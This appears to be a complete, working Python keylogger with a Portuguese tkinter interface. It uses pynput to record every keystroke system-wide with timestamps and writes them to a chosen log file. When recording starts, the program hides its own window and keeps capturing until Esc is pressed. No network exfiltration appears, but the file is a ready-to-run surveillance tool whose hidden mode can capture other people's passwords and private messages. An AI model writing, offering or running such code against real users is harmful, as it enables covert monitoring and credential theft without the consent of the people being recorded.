import tkinter as tk
from tkinter import filedialog, messagebox
from pynput import keyboard
from datetime import datetime

class KeyloggerApp:
    def __init__(self, master):
        self.master = master
        self.master.title("Keylogger")
        
        self.is_logging = False
        self.log_file = "key_log.txt"
        
        self.start_button = tk.Button(master, text="Iniciar Gravação", command=self.start_logging)
        self.start_button.pack(pady=20)
        
        self.stop_button = tk.Button(master, text="Parar Gravação", command=self.stop_logging, state=tk.DISABLED)
        self.stop_button.pack(pady=20)

        self.choose_file_button = tk.Button(master, text="Escolher Local de Salvar", command=self.choose_log_file)
        self.choose_file_button.pack(pady=20)

        self.clear_log_button = tk.Button(master, text="Limpar Log", command=self.clear_log)
        self.clear_log_button.pack(pady=20)

        # Campo de texto para exibir o log
        self.log_text = tk.Text(master, height=10, width=50)
        self.log_text.pack(pady=20)

    def log_start_time(self):
        with open(self.log_file, "a") as f:
            start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            f.write(f"Registro iniciado em: {start_time}\n")

    def on_press(self, key):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        try:
            key_str = f'{key.char}'
        except AttributeError:
            key_str = f' {key} '
        
        log_entry = f'[{timestamp}] {key_str}'
        
        # Salvar no arquivo de log
        with open(self.log_file, "a") as f:
            f.write(log_entry)
        
        # Atualizar campo de texto
        self.log_text.insert(tk.END, log_entry + '\n')
        self.log_text.see(tk.END)  # Scroll para a parte mais recente

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop_logging()  # Para a gravação ao pressionar "Esc"

    def start_logging(self):
        if not self.is_logging:
            self.log_start_time()
            self.is_logging = True
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.master.withdraw()  # Oculta a janela principal
            self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()

    def stop_logging(self):
        if self.is_logging:
            self.listener.stop()
            self.is_logging = False
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.master.deiconify()  # Mostra a janela novamente

    def choose_log_file(self):
        file_path = filedialog.asksaveasfilename(defaultextension=".txt", 
                                                   filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if file_path:
            self.log_file = file_path
            messagebox.showinfo("Info", f"Log será salvo em: {self.log_file}")

    def clear_log(self):
        self.log_text.delete(1.0, tk.END)  # Limpar o campo de texto
        with open(self.log_file, "w") as f:  # Limpar o arquivo de log
            f.write("")
        messagebox.showinfo("Info", "Log limpo com sucesso!")

if __name__ == "__main__":
    root = tk.Tk()
    app = KeyloggerApp(root)
    root.mainloop()
